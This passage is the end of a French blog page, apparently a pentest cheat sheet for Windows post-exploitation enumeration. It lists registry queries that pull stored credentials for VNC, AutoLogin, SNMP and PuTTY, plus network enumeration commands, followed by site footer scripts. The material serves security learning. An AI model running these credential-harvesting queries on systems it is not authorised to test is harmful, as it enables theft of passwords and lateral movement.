</span></span><span style="display:flex;"><span>- VNC : reg query <span style="color:#e6db74">&#34;HKCU\Software\ORL\WinVNC3\Password&#34;</span>
</span></span><span style="display:flex;"><span>- Windows AutoLogin : reg query <span style="color:#e6db74">&#34;HKLM\Software\Microsoft\Windows NT\Currentversion\Winlogon&#34;</span>
</span></span><span style="display:flex;"><span>- SNMP : reg query <span style="color:#e6db74">&#34;HKLM\SYSTEM\Current\ControlSet\Services\SNMP&#34;</span>
</span></span><span style="display:flex;"><span>- PuTTY : reg query <span style="color:#e6db74">&#34;HKCU\Software\SimonTatham\PuTTY\Sessions&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Ne pas hésiter à regarder dans les dossiers des services qui tournent sur la machine <span style="color:#f92672">(</span>site web sur xampp par exemple, ftp si on ne sait pas ce qu<span style="color:#960050;background-color:#1e0010">&#39;</span>il y a dessus, share smb, ...<span style="color:#f92672">)</span>.
</span></span></code></pre></div><h3 id="routes-et-ports-1">Routes et ports<a hidden class="anchor" aria-hidden="true" href="#routes-et-ports-1">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>- ipconfig
</span></span><span style="display:flex;"><span>- arp -a
</span></span><span style="display:flex;"><span>- route print
</span></span><span style="display:flex;"><span>- netstat -ano
</span></span></code></pre></div>

  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2023 <a href="https://kransy.cyberkoopas.fr/">Kransy</a></span>
    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
</body>

</html>
